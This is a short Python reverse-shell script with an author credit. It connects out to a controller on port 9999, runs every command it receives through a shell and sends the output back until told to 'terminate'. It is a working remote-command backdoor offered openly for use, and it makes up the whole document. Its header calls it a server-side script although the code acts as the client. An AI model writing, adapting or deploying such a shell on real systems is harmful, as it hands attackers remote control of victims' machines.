#Server Side Script
#!/usr/bin/env python

#############################################################
# #----- Simple Reverse shel anay Interface In Linux -----# #
#                                                           #
# #----- Created By : Eng-Mohmed Elsayed ----- #            #
#                                                           #
#############################################################
import socket           
import subprocess
def connect():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host = socket.gethostname()         # Get current machine name
    port = 9999                         # Client wants to connect to server's                    # port number 9999
    s.connect((host,port))

    while True :
        try:
            command=s.recv(1024).decode("utf-8")
            print('Server Says :- ',command)
            if 'terminate' in command:
                s.close()
                break

            else:
                    CMD=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    s.send(CMD.stdout.read())
                    s.send(CMD.stderr.read())

        except ConnectionAbortedError as e:
            print("Server Connection Closed !\n\n\n",e)
connect()
